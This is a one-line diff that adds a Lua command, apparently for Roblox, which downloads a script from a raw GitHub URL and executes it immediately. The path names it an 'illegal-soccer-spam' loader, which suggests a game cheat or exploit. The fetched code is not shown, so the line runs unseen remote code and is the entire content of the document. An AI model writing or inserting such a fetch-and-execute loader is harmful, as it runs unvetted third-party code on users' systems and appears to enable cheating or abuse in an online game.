@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HarmonicPigeonExalt/loaders/main/loaders/update-illegal-soccer-spam6-nl8r91ykkydjqr.lua"))()
